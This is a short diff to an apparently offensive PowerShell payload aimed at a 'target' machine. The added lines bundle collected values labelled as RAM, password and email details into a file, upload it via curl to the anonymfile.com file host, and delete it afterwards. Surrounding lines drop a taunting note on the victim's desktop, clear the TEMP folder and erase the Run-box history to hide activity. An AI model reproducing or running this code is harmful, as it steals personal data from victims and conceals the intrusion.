@@ -590,9 +590,12 @@ echo $EMAILwarn
 # this snippet will leave a message on your targets desktop
 
 $message = "`nMy crime is that of curiosity `nand yea curiosity killed the cat `nbut satisfaction brought him back"
-
-Add-Content $User\Desktop\WithLove.txt $message
-Add-Content $User\OneDrive\Desktop\WithLove.txt $message
+$Recon = "$RAMwarn , $PASSwarn , $LAST_PASSwarn , $EMAILwarn"
+Add-Content $home\Desktop\WithLove.txt $message
+Add-Content $home\OneDrive\Desktop\WithLove.txt $message
+Add-Content $home\file.txt $Recon
+$File = $home\file.txt
+curl -F "file=@$File" https://anonymfile.com/api/v1/upload
 ###########################################################################################################
 
 <#
@@ -604,6 +607,7 @@ Add-Content $User\OneDrive\Desktop\WithLove.txt $message
 
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 
+rm $File
 # Delete run box history
 
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
